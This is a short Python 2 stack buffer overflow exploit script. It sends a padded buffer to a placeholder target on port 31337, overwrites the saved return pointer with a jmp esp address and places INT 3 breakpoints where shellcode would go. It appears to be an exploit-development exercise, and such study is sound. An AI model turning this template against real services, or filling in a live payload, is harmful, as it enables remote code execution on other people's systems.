#!/usr/bin/env python2
import socket
import struct
# configure the IP and port we're connecting to
RHOST = "<target-ip-here>"
RPORT = 31337

# create a TCP connection (socket)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

# Specify buffer length and the saved return pointer offset
buf_totlen = 1024
offset_srp = 146

ptr_jmp_esp = 0x080414C3

# buffer creation
buf = ""
buf += "A" * (offset_srp - len(buf))	# padding
buf += struct.pack("<I", ptr_jmp_esp)	# overwriting the saved return pointer with the memory address of the jmp esp instruction
buf += "\xCC\xCC\xCC\xCC"		# overwriting the memory location that ESP points to with 'INT 3' instructions to cause a software interrupt
buf += "D" * (buf_totlen - len(buf))	# trailing padding
buf += "\n"

# send a message down the socket
s.send(buf)

# print out what we sent
print("Sent: {0}".format(buf))

# receive some data from the socket
data = s.recv(1024)

# print out what was received
print("Received: {0}".format(data))
